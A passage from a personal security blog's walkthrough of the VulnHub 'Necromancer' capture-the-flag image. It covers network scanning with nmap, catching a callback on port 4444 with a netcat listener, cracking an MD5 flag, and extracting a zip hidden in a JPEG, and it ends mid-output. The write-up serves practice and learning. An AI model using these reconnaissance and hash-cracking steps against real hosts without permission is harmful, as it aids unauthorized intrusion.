<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Necromancer | Erik&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="The Necromancer CTF (available at vulnhub) sends you on a journey to defeat the Necromancer that inhabits the OpenBSD based image. The fact that the flags kind of resembles an overarching story is a r">
<meta name="keywords" content="CTF">
<meta property="og:type" content="article">
<meta property="og:title" content="Necromancer">
<meta property="og:url" content="https://erikgeiser.com/2017/12/necromancer/index.html">
<meta property="og:site_name" content="Erik&#39;s Blog">
<meta property="og:description" content="The Necromancer CTF (available at vulnhub) sends you on a journey to defeat the Necromancer that inhabits the OpenBSD based image. The fact that the flags kind of resembles an overarching story is a r">
<meta property="og:locale" content="default">
<meta property="og:image" content="https://erikgeiser.com/2017/12/necromancer/logo.jpeg">
<meta property="og:image" content="https://erikgeiser.com/2017/12/necromancer/wireshark.png">
<meta property="og:image" content="https://erikgeiser.com/2017/12/necromancer/chasm.png">
<meta property="og:image" content="https://erikgeiser.com/2017/12/necromancer/cave.png">
<meta property="og:image" content="https://erikgeiser.com/2017/12/necromancer/necromancer.jpg">
<meta property="og:image" content="https://erikgeiser.com/2017/12/necromancer/pcap.png">
<meta property="og:updated_time" content="2018-08-23T08:08:05.572Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Necromancer">
<meta name="twitter:description" content="The Necromancer CTF (available at vulnhub) sends you on a journey to defeat the Necromancer that inhabits the OpenBSD based image. The fact that the flags kind of resembles an overarching story is a r">
<meta name="twitter:image" content="https://erikgeiser.com/2017/12/necromancer/logo.jpeg">
  
    <link rel="alternate" href="/atom.xml" title="Erik&#39;s Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Erik&#39;s Blog</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">IT Security and CTF Write Ups</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
          <a class="main-nav-link" href="/about-me">About Me</a>
        
          <a class="main-nav-link" href="/imprint">Imprint</a>
        
          <a class="main-nav-link" href="/privacy-policy">Privacy Policy</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://erikgeiser.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-necromancer" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/12/necromancer/" class="article-date">
  <time datetime="2017-12-17T16:53:11.000Z" itemprop="datePublished">17.12.2017</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      Necromancer
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>The Necromancer CTF (available at <a href="https://www.vulnhub.com/entry/the-necromancer-1,154/" target="_blank" rel="noopener">vulnhub</a>) sends you on a journey to defeat the Necromancer that inhabits the OpenBSD based image. The fact that the flags kind of resembles an overarching story is a really nice touch on otherwise technically interesting but dry CTFs.</p>
<img src="/2017/12/necromancer/logo.jpeg" title="Necromancer Logo">
<p><em><strong>Warning:</strong> From here on there will obviously be nothing but spoilers if you want to try the CTF yourself.</em></p>
<hr>
<h3 id="First-Steps-Entering-the-realm-of-the-Necromancer"><a href="#First-Steps-Entering-the-realm-of-the-Necromancer" class="headerlink" title="First Steps: Entering the realm of the Necromancer"></a>First Steps: Entering the realm of the Necromancer</h3><p>First, the Necromancer’s residence is to be found. A quick <code>netdiscover -r 10.0.2.5/24</code> reveals a suspicious presence at <code>10.0.2.10</code>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Currently scanning: Finished!   |   Screen View: Unique Hosts</span><br><span class="line"></span><br><span class="line">4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240</span><br><span class="line">_____________________________________________________________________________</span><br><span class="line">  IP            At MAC Address     Count     Len  MAC Vendor / Hostname</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">10.0.2.1        52:54:00:12:35:00      1      60  Unknown vendor</span><br><span class="line">10.0.2.2        52:54:00:12:35:00      1      60  Unknown vendor</span><br><span class="line">10.0.2.3        08:00:27:99:bb:18      1      60  PCS Systemtechnik GmbH</span><br><span class="line">10.0.2.10       08:00:27:de:4e:19      1      60  PCS Systemtechnik GmbH</span><br></pre></td></tr></table></figure></p>
<p>We shall therefore investigate with <code>nmap -sTV 10.0.2.10</code> to see if any common TCP ports are open. All 1000 scanned ports are filtered. Just to be sure that there are no uncommon open TCP ports I run  <code>nmap -sTV -p- 10.0.2.10</code> which scans all ports and reveals that they are all filtered. Maybe UDP is the protocol of choice, so the next try is <code>nmap -sU -p- 10.0.2.10</code>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.0.2.10</span><br><span class="line">Host is up (0.00055s latency).</span><br><span class="line">Not shown: 65534 open|filtered ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">666/udp open  doom</span><br><span class="line">MAC Address: 08:00:27:DE:4E:19 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 124.04 seconds</span><br></pre></td></tr></table></figure></p>
<p>So port 666 is an open UDP port that runs the service <em>doom</em>? Interesting :godmode: …</p>
<p>Let’s see if we can communicate via <code>netcat -u 10.0.2.10 666</code>. The connection opens but nothing a appears. Hesitatingly, I type “<em>hello?</em>“; from the darkness a  voice resounds: “<em>You gasp for air! Time is running out!</em>“. What’s that supposed to mean? I decide to try a few things (actually I tried a lot more, all with the same result):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;hello?</span><br><span class="line">You gasp for air! Time is running out!</span><br><span class="line">&gt;time</span><br><span class="line">You gasp for air! Time is running out!</span><br><span class="line">&gt;breath</span><br><span class="line">You gasp for air! Time is running out!</span><br><span class="line">&gt;IDDQD</span><br><span class="line">You gasp for air! Time is running out!</span><br></pre></td></tr></table></figure></p>
<p>I had to try the last one, given that the service is called <em>doom</em>. Countless different attemps all fail to lure out any other response, although it seems to be possible to crash the service which does not help either. We hit a brick wall…</p>
<h3 id="1st-Flag-If-I-can’t-get-to-you-you-shall-come-to-me"><a href="#1st-Flag-If-I-can’t-get-to-you-you-shall-come-to-me" class="headerlink" title="1st Flag: If I can’t get to you, you shall come to me"></a>1st Flag: If I can’t get to you, you shall come to me</h3><p>In hindsight the next step makes a lot of sense, but the CTFs I did before were all based around the idea that there is always some vulnerable service on some port. Since the only service in this case is <em>doom</em> on 666 I spent way to much time trying to exploit it. I do not want to make this writeup feel like I instantly switched to the following approach. In fact, I quit trying for that day but kept thinking about it. At some point I had the idea to watch the Necromancer’s activity with Wireshark:</p>
<img src="/2017/12/necromancer/wireshark.png" title="Wireshark Log">
<p>There it is! The Necromancer want’s to talk with us. Every minute a TCP SYN packet is sent to port 4444 of our machine. I had not anticipated something like that, because usually CTFs are based around (pseudo) realistic scenarios where this would not be likely to happen.</p>
<p>But enough talk, let’s here what he has to say:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# netcat -l -p 4444</span><br><span class="line">...V2VsY29tZSENCg0KWW91IGZpbmQgeW91cnNlbGYgc3RhcmluZyB0b3dhcmRzIHRoZSBob3Jpem9uLCB3aXRoIG5vdGhpbmcgYnV0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxhbmQgb2Ygbm90aGluZ25lc3MuDQoNClR1cm5pbmcgdG8geW91ciBub3J0aCB5b3Ugbm90aWNlIGEgc21hbGwgZmxpY2tlciBvZiBsaWdodCBpbiB0aGUgZGlzdGFuY2UuDQpZb3Ugd2FsayBub3J0aCB0b3dhcmRzIHRoZSBmbGlja2VyIG9mIGxpZ2h0LCBvbmx5IHRvIGJlIHN0b3BwZWQgYnkgc29tZSB0eXBlIG9mIGludmlzaWJsZSBiYXJyaWVyLiAgDQoNClRoZSBhaXIgYXJvdW5kIHlvdSBiZWdpbnMgdG8gZ2V0IHRoaWNrZXIsIGFuZCB5b3VyIGhlYXJ0IGJlZ2lucyB0byBiZWF0IGFnYWluc3QgeW91ciBjaGVzdC4gDQpZb3UgdHVybiB0byB5b3VyIGxlZnQuLiB0aGVuIHRvIHlvdXIgcmlnaHQhICBZb3UgYXJlIHRyYXBwZWQhDQoNCllvdSBmdW1ibGUgdGhyb3VnaCB5b3VyIHBvY2tldHMuLiBub3RoaW5nISAgDQpZb3UgbG9vayBkb3duIGFuZCBzZWUgeW91IGFyZSBzdGFuZGluZyBpbiBzYW5kLiAgDQpEcm9wcGluZyB0byB5b3VyIGtuZWVzIHlvdSBiZWdpbiB0byBkaWcgZnJhbnRpY2FsbHkuDQoNCkFzIHlvdSBkaWcgeW91IG5vdGljZSB0aGUgYmFycmllciBleHRlbmRzIHVuZGVyZ3JvdW5kISAgDQpGcmFudGljYWxseSB5b3Uga2VlcCBkaWdnaW5nIGFuZCBkaWdnaW5nIHVudGlsIHlvdXIgbmFpbHMgc3VkZGVubHkgY2F0Y2ggb24gYW4gb2JqZWN0Lg0KDQpZb3UgZGlnIGZ1cnRoZXIgYW5kIGRpc2NvdmVyIGEgc21hbGwgd29vZGVuIGJveC4gIA0KZmxhZzF7ZTYwNzhiOWIxYWFjOTE1ZDExYjlmZDU5NzkxMDMwYmZ9IGlzIGVuZ3JhdmVkIG9uIHRoZSBsaWQuDQoNCllvdSBvcGVuIHRoZSBib3gsIGFuZCBmaW5kIGEgcGFyY2htZW50IHdpdGggdGhlIGZvbGxvd2luZyB3cml0dGVuIG9uIGl0LiAiQ2hhbnQgdGhlIHN0cmluZyBvZiBmbGFnMSAtIHU2NjYi...</span><br></pre></td></tr></table></figure>
<p>That looks encrypted. Let’s try the usual suspects (after we get rid of the “…”):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# netcat -l -p 4444 &gt; answer</span><br><span class="line">root@kali:~# vim answer</span><br><span class="line">root@kali:~# cat answer | base64 -d</span><br><span class="line">Welcome!</span><br><span class="line"></span><br><span class="line">You find yourself staring towards the horizon, with nothing but silence surrounding you.</span><br><span class="line">You look east, then south, then west, all you can see is a great wasteland of nothingness.</span><br><span class="line"></span><br><span class="line">Turning to your north you notice a small flicker of light in the distance.</span><br><span class="line">You walk north towards the flicker of light, only to be stopped by some type of invisible barrier.</span><br><span class="line"></span><br><span class="line">The air around you begins to get thicker, and your heart begins to beat against your chest.</span><br><span class="line">You turn to your left.. then to your right!  You are trapped!</span><br><span class="line"></span><br><span class="line">You fumble through your pockets.. nothing!</span><br><span class="line">You look down and see you are standing in sand.</span><br><span class="line">Dropping to your knees you begin to dig frantically.</span><br><span class="line"></span><br><span class="line">As you dig you notice the barrier extends underground!</span><br><span class="line">Frantically you keep digging and digging until your nails suddenly catch on an object.</span><br><span class="line"></span><br><span class="line">You dig further and discover a small wooden box.</span><br><span class="line">flag1&#123;e6078b9b1aac915d11b9fd59791030bf&#125; is engraved on the lid.</span><br><span class="line"></span><br><span class="line">You open the box, and find a parchment with the following written on it. &quot;Chant the string of flag1 - u666&quot;</span><br></pre></td></tr></table></figure>
<p>We have our first flag <code>e6078b9b1aac915d11b9fd59791030bf</code> and it seems like our story has just begun.</p>
<h3 id="2nd-Flag-We-meet-again"><a href="#2nd-Flag-We-meet-again" class="headerlink" title="2nd Flag: We meet again"></a>2nd Flag: We meet again</h3><p>After we previously had no luck with our progress, the last lead seems to shine some light on the situation as <code>u666</code> obviously stands for the port behind which the doom service sends cryptic messages.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nc -u 10.0.2.10 666</span><br><span class="line">flag1&#123;e6078b9b1aac915d11b9fd59791030bf&#125;</span><br><span class="line">Chant is too long! You gasp for air!</span><br><span class="line">e6078b9b1aac915d11b9fd59791030bf</span><br><span class="line">Chant had no affect! Try in a different tongue!</span><br></pre></td></tr></table></figure>
<p>At least some response. We are on the right track, but what might the required tongue mean? In what ‘tongue’ is our flag even? We can rule out base64 as attempting to decode produces <code>{�;��[զ��^]�V�}�}��t�F�</code>. The next idea would be some kind of hash. We can make some educated guesses here, based on the fact that the flag is 32 characters long:</p>
<ul>
<li>SHA-0/1/2: SHA-0/1 would produce a 160-bit digest, resulting in <code>160/4=40</code> characters. SHA-2 would therefore produce even longer digests.</li>
<li>SHA-3: Since the SHA-3 digest size is arbitrary so it could possibly represent the flag.</li>
<li>MD5: This hash algorithm produces a 128-bit hash which corresponds to a 32 characters which matches our flag.</li>
</ul>
<p>Due to the exact match I first assume that it is a MD5 hash. The next step is to translate the hash. MD5 is not reversible but it is not designed to resist cracking attempts, so we can give it a try. A quick search leads to <a href="https://crackstation.net/" target="_blank" rel="noopener">crackstation</a> which is able to reverse the hash instantly to <code>opensesame</code>. Before trying out to re-hash it with another algorithm I try it out unhashed:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nc -u 10.0.2.10 666</span><br><span class="line">opensesame</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">A loud crack of thunder sounds as you are knocked to your feet!</span><br><span class="line"></span><br><span class="line">Dazed, you start to feel fresh air entering your lungs.</span><br><span class="line"></span><br><span class="line">You are free!</span><br><span class="line"></span><br><span class="line">In front of you written in the sand are the words:</span><br><span class="line"></span><br><span class="line">flag2&#123;c39cd4df8f2e35d20d92c2e44de5f7c6&#125;</span><br><span class="line"></span><br><span class="line">As you stand to your feet you notice that you can no longer see the flicker of light in the distance.</span><br><span class="line"></span><br><span class="line">You turn frantically looking in all directions until suddenly, a murder of crows appear on the horizon.</span><br><span class="line"></span><br><span class="line">As they get closer you can see one of the crows is grasping on to an object. As the sun hits the object, shards of light beam from its surface.</span><br><span class="line"></span><br><span class="line">The birds get closer, and closer, and closer.</span><br><span class="line"></span><br><span class="line">Staring up at the crows you can see they are in a formation.</span><br><span class="line"></span><br><span class="line">Squinting your eyes from the light coming from the object, you can see the formation looks like the numeral 80.</span><br><span class="line"></span><br><span class="line">As quickly as the birds appeared, they have left you once again.... alone... tortured by the deafening sound of silence.</span><br><span class="line"></span><br><span class="line">666 is closed.</span><br></pre></td></tr></table></figure>
<p>Nice, no need to try out all the other possible hash functions. On to the next flag…</p>
<h3 id="3rd-Flag-The-first-encounter-at-the-chasm"><a href="#3rd-Flag-The-first-encounter-at-the-chasm" class="headerlink" title="3rd Flag: The first encounter at the chasm"></a>3rd Flag: The first encounter at the chasm</h3><p>The crows show us the way, so we saddle our web browser and follow. The 80 formed by the crows is a reference to the port through which unencrypted http traffic flows.</p>
<img src="/2017/12/necromancer/chasm.png" title="The Chasm">
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Hours have passed since you first started to follow the crows.</span><br><span class="line">Silence continues to engulf you as you treck towards a mountain range on the horizon.</span><br><span class="line">More times passes and you are now standing in front of a great chasm.</span><br><span class="line">Across the chasm you can see a necromancer standing in the mouth of a cave, staring skyward at the circling crows.</span><br><span class="line">As you step closer to the chasm, a rock dislodges from beneath your feet and falls into the dark depths.</span><br><span class="line">The necromancer looks towards you with hollow eyes which can only be described as death.</span><br><span class="line">He smirks in your direction, and suddenly a bright light momentarily blinds you.</span><br><span class="line">The silence is broken by a blood curdling screech of a thousand birds, followed by the necromancers laughs fading as he decends into the cave!</span><br><span class="line">The crows break their formation, some flying aimlessly in the air; others now motionless upon the ground.</span><br><span class="line">The cave is now protected by a gaseous blue haze, and an organised pile of feathers lay before you.</span><br></pre></td></tr></table></figure>
<p>We have just met the Necromancer, let the hunt begin. The only lead we have is the image on the page. Let’s download and analyze it:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# ls</span><br><span class="line">pileoffeathers.jpg</span><br><span class="line">root@kali:~/ctf/necromancer# file pileoffeathers.jpg</span><br><span class="line">pileoffeathers.jpg: JPEG image data, Exif standard: [TIFF image data, little-endian, direntries=0], baseline, precision 8, 640x290, frames 3</span><br><span class="line">root@kali:~/ctf/necromancer# exiftool pileoffeathers.jpg</span><br><span class="line">ExifTool Version Number         : 10.67</span><br><span class="line">File Name                       : pileoffeathers.jpg</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 36 kB</span><br><span class="line">File Modification Date/Time     : 2017:12:17 19:41:05+01:00</span><br><span class="line">File Access Date/Time           : 2017:12:17 19:41:05+01:00</span><br><span class="line">File Inode Change Date/Time     : 2017:12:17 19:41:05+01:00</span><br><span class="line">File Permissions                : rw-r--r--</span><br><span class="line">File Type                       : JPEG</span><br><span class="line">File Type Extension             : jpg</span><br><span class="line">MIME Type                       : image/jpeg</span><br><span class="line">Exif Byte Order                 : Little-endian (Intel, II)</span><br><span class="line">Quality                         : 60%</span><br><span class="line">XMP Toolkit                     : Adobe XMP Core 5.0-c060 61.134777, 2010/02/12-17:32:00</span><br><span class="line">Creator Tool                    : Adobe Photoshop CS5 Windows</span><br><span class="line">Instance ID                     : xmp.iid:9678990A5A7D11E293DFC864BA726A9F</span><br><span class="line">Document ID                     : xmp.did:9678990B5A7D11E293DFC864BA726A9F</span><br><span class="line">Derived From Instance ID        : xmp.iid:967899085A7D11E293DFC864BA726A9F</span><br><span class="line">Derived From Document ID        : xmp.did:967899095A7D11E293DFC864BA726A9F</span><br><span class="line">DCT Encode Version              : 100</span><br><span class="line">APP14 Flags 0                   : [14], Encoded with Blend=1 downsampling</span><br><span class="line">APP14 Flags 1                   : (none)</span><br><span class="line">Color Transform                 : YCbCr</span><br><span class="line">Image Width                     : 640</span><br><span class="line">Image Height                    : 290</span><br><span class="line">Encoding Process                : Baseline DCT, Huffman coding</span><br><span class="line">Bits Per Sample                 : 8</span><br><span class="line">Color Components                : 3</span><br><span class="line">Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)</span><br><span class="line">Image Size                      : 640x290</span><br><span class="line">Megapixels                      : 0.186</span><br></pre></td></tr></table></figure>
<p>Nothing out of the ordinary. Maybe the image contains some steganography.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# steghide info pileoffeathers.jpg</span><br><span class="line">&quot;pileoffeathers.jpg&quot;:</span><br><span class="line">  format: jpeg</span><br><span class="line">  capacity: 2.0 KB</span><br><span class="line">Try to get information about embedded data ? (y/n) y</span><br><span class="line">Enter passphrase:</span><br><span class="line">steghide: could not extract any data with that passphrase!</span><br></pre></td></tr></table></figure>
<p>No luck, I tried a few pass phrases like “Necromancer”, “necromancer”, the number of crows (all black-white combinations as numbers and written out), the number of feathers, and a few variations of the last flag. This seems to be a dead end, but we don’t give up just yet:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# du -sh pileoffeathers.jpg</span><br><span class="line">40K	pileoffeathers.jpg</span><br><span class="line">root@kali:~/ctf/necromancer# binwalk pileoffeathers.jpg</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             JPEG image data, EXIF standard</span><br><span class="line">12            0xC             TIFF image data, little-endian offset of first image directory: 8</span><br><span class="line">270           0x10E           Unix path: /www.w3.org/1999/02/22-rdf-syntax-ns#&quot;&gt; &lt;rdf:Description rdf:about=&quot;&quot; xmlns:xmp=&quot;http://ns.adobe.com/xap/1.0/&quot; xmlns:xmpMM=&quot;http...&quot;&gt;</span><br><span class="line">36994         0x9082          Zip archive data, at least v2.0 to extract, compressed size: 121, uncompressed size: 125, name: feathers.txt</span><br><span class="line">37267         0x9193          End of Zip archive</span><br></pre></td></tr></table></figure>
<p><code>binwalk</code> reveals that we do not just have an image at hand: The file also contains a zip archive.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# mv pileoffeathers.jpg pileoffeathers.zip</span><br><span class="line">root@kali:~/ctf/necromancer# unzip pileoffeathers.zip</span><br><span class="line">Archive:  pileoffeathers.zip</span><br><span class="line">warning [pileoffeathers.zip]:  36994 extra bytes at beginning or within zipfile</span><br><span class="line">  (attempting to process anyway)</span><br><span class="line">  inflating: feathers.txt</span><br><span class="line">root@kali:~/ctf/necromancer# ls</span><br><span class="line">feathers.txt  pileoffeathers.zip</span><br><span class="line">root@kali:~/ctf/necromancer# cat feathers.txt</span><br><span class="line">ZmxhZzN7OWFkM2Y2MmRiN2I5MWMyOGI2ODEzNzAwMDM5NDYzOWZ9IC0gQ3Jvc3MgdGhlIGNoYXNtIGF0IC9hbWFnaWNicmlkZ2VhcHBlYXJzYXR0aGVjaGFzbQ==</span><br><span class="line">root@kali:~/ctf/necromancer# cat feathers.txt | base64 -d</span><br><span class="line">flag3&#123;9ad3f62db7b91c28b68137000394639f&#125; - Cross the chasm at /amagicbridgeappearsatthechasm</span><br></pre></td></tr></table></figure>
<p>And on goes the journey…</p>
<h3 id="4th-Flag-Journey-from-the-highest-webs-to-the-lowest-binaries"><a href="#4th-Flag-Journey-from-the-highest-webs-to-the-lowest-binaries" class="headerlink" title="4th Flag: Journey from the highest webs to the lowest binaries"></a>4th Flag: Journey from the highest webs to the lowest binaries</h3><img src="/2017/12/necromancer/cave.png" title="The Cave">
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">You cautiously make your way across chasm.</span><br><span class="line">You are standing on a snow covered plateau, surrounded by shear cliffs of ice and stone.</span><br><span class="line">The cave before you is protected by some sort of spell cast by the necromancer.</span><br><span class="line">You reach out to touch the gaseous blue haze, and can feel life being drawn from your soul the closer you get.</span><br><span class="line">Hastily you take a few steps back away from the cave entrance.</span><br><span class="line">There must be a magical item that could protect you from the necromancer&apos;s spell.</span><br></pre></td></tr></table></figure>
<p>Again our only lead is the image on the page, so we try the same again:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# ls</span><br><span class="line">magicbook.jpg</span><br><span class="line">root@kali:~/ctf/necromancer# file magicbook.jpg</span><br><span class="line">magicbook.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 600x450, frames 3</span><br><span class="line">root@kali:~/ctf/necromancer# du -sh magicbook.jpg</span><br><span class="line">156K	magicbook.jpg</span><br><span class="line">root@kali:~/ctf/necromancer# exiftool magicbook.jpg</span><br><span class="line">ExifTool Version Number         : 10.67</span><br><span class="line">File Name                       : magicbook.jpg</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 154 kB</span><br><span class="line">File Modification Date/Time     : 2017:12:17 19:37:48+01:00</span><br><span class="line">File Access Date/Time           : 2017:12:17 19:38:01+01:00</span><br><span class="line">File Inode Change Date/Time     : 2017:12:17 19:37:49+01:00</span><br><span class="line">File Permissions                : rw-r--r--</span><br><span class="line">File Type                       : JPEG</span><br><span class="line">File Type Extension             : jpg</span><br><span class="line">MIME Type                       : image/jpeg</span><br><span class="line">JFIF Version                    : 1.01</span><br><span class="line">Resolution Unit                 : None</span><br><span class="line">X Resolution                    : 1</span><br><span class="line">Y Resolution                    : 1</span><br><span class="line">Image Width                     : 600</span><br><span class="line">Image Height                    : 450</span><br><span class="line">Encoding Process                : Baseline DCT, Huffman coding</span><br><span class="line">Bits Per Sample                 : 8</span><br><span class="line">Color Components                : 3</span><br><span class="line">Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)</span><br><span class="line">Image Size                      : 600x450</span><br><span class="line">Megapixels                      : 0.270</span><br><span class="line">root@kali:~/ctf/necromancer# binwalk magicbook.jpg</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     